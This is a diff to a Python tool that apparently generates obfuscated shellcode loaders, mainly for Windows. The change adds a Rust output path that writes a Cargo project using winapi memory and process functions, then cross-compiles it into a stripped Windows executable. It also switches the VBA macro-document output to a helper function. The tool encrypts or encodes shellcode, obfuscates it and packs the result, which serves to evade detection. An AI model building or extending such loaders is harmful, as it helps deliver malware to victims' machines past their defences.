@@ -4,22 +4,19 @@ import importlib.util
 import platform
 from utils.utils import *
 import sys
+import tempfile
 import os
+import shutil
 import subprocess
 import codecs
 from utils.inject import create_word_doc
-
-try:
-    import win32com.client
-except:
-    pass
 
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('-e', "--transformers", type=str, required=False, help='Transformers encrypt or encode the shellcode and is decrypted or decoded at runtime.')
     parser.add_argument('-s', "--shellcode", type=str, required=True, help='Specifies the raw binary shellcode file')
     parser.add_argument('-t', "--template", type=str, required=True, help='Template that the shellcode and deobfuscation code will be placed into.')
-    parser.add_argument('-l', "--language", type=str, choices={"c","cs","ps1","vba"}, required=True, help='Language used to write and compile')
+    parser.add_argument('-l', "--language", type=str, choices={"c","cs","ps1","vba", "rs"}, required=True, help='Language used to write and compile')
     parser.add_argument('-f', "--obfuscator", type=str, required=False, help='Obfuscators transform the transformed shellcode bytes into other formats, such as strings.')
     parser.add_argument('-b', "--preprocessors", type=str, required=False, help='Preprocessors modify the shellcode but are self decoding.')
     parser.add_argument('-a', "--postprocessors", type=str, required=False, help='Postprocessors obfuscate the resulting exe or script, e.g. packers')
@@ -38,6 +35,8 @@ def main():
         transformers = 'shellcode = {shellcode}'
     elif args.language == 'ps1':
         transformers = '[Byte[]]$shellcode = {shellcode}'
+    elif args.language == 'rs':
+        transformers = 'let shellcode = {shellcode};'
     imports = []
 
     # Transform shellcode
@@ -140,23 +139,35 @@ def main():
             print(f'Payload saved to {outfile}')
     elif args.language == 'vba':
         outfile = f'{args.output}.docm'
-        """
-        word_app = win32com.client.gencache.EnsureDispatch("Word.Application")
-        word_app.Visible = False
-        word_app.DisplayAlerts = False
-        doc = word_app.Documents.Add()
-        vba_module = doc.VBProject.VBComponents.Add(1)
-        vba_module.CodeModule.AddFromString(formattedCode)
-        out_path = os.path.abspath(f'{args.output}.docm')
-        doc.SaveAs2(out_path, FileFormat=13)
-        doc.Close(SaveChanges=False)
-        word_app.Quit()
-        print(f'Word Doc saved to {args.output}.docm')
-        """
         result = create_word_doc(formattedCode, outfile)
         print(f'Macro saved to {outfile}')
     elif args.language == 'ps1':
         outfile = f'{args.output}.ps1'
+    elif args.language == 'rs':
+        if args.output.lower()[-4:] != '.exe':
+            outfile = args.output + '.exe'
+        else:
+            outfile = args.output
+        shutil.rmtree('output', ignore_errors=True)
+        os.makedirs(f'output/src/', exist_ok=True)
+        open(f'output/src/main.rs', 'w').write(formattedCode)
+        open(f'output/Cargo.toml', 'w').write("""
+[package]
+name = "output"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+winapi = {version = "0.3.9", features = ["winnt", "synchapi", "memoryapi", "processthreadsapi"]}
+
+[profile.release]
+strip = true
+lto = true
+""")
+        result = subprocess.run(['cargo', 'build', '--release', '--target', 'x86_64-pc-windows-gnu'], cwd='output')
+        shutil.copy('output/target/x86_64-pc-windows-gnu/release/output.exe', 'output.exe')
+        if result.returncode == 0:
+            print(f'Payload saved to {outfile}')
 
     if args.postprocessors:
         postprocessorsList = args.postprocessors.split(',')
